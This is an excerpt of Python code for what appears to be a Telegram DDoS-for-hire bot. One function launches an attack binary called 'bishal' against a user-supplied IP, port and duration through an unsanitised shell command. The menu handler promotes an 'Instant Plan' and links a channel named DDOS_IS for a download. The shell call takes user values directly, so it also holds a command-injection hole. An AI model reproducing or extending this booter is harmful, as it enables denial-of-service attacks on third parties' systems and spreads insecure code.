...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bishal {target_ip} {target_port} {duration} 80")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/DDOS_IS/122*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*https://youtu.be/MwBcUWwRkX8?si=oxtlgqjY7zZbPR6R*", parse_mode='Markdown')
